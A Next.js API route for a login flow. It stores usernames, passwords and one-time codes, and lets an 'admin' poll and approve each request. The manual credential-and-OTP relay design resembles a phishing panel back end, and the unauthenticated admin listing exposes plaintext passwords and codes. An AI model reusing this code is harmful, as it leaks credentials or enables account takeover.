import { NextRequest, NextResponse } from 'next/server'
import { loginStore, LoginStatus } from '@/lib/login-store'

export async function GET(request: NextRequest) {
    const searchParams = request.nextUrl.searchParams
    const requestId = searchParams.get('requestId')

    if (!requestId) {
        // Admin listing
        const requests = loginStore.getAllRequests()
        return NextResponse.json(requests)
    }

    // User polling
    const req = loginStore.getRequest(requestId)
    if (!req) {
        return NextResponse.json({ error: 'Request not found' }, { status: 404 })
    }

    return NextResponse.json(req)
}

export async function POST(request: NextRequest) {
    try {
        const body = await request.json()
        const { action, requestId, username, password, otp, status } = body

        // 1. Start Login
        if (action === 'start') {
            const newReq = loginStore.createRequest({
                username,
                password,
                ip: '192.168.1.100', // Mock IP
                device: 'Desktop Chrome' // Mock Device
            })
            return NextResponse.json(newReq)
        }

        // 2. Submit OTP
        if (action === 'submit_otp') {
            if (!requestId || !otp) return NextResponse.json({ error: 'Missing data' }, { status: 400 })

            const updatedReq = loginStore.submitOtp(requestId, otp)
            return NextResponse.json(updatedReq)
        }

        // 3. Admin Update Status
        if (action === 'admin_update') {
            if (!requestId || !status) return NextResponse.json({ error: 'Missing data' }, { status: 400 })

            const updatedReq = loginStore.updateStatus(requestId, status as LoginStatus)
            return NextResponse.json(updatedReq)
        }

        return NextResponse.json({ error: 'Invalid action' }, { status: 400 })

    } catch (error) {
        console.error('Login flow error:', error)
        return NextResponse.json({ error: 'Internal error' }, { status: 500 })
    }
}
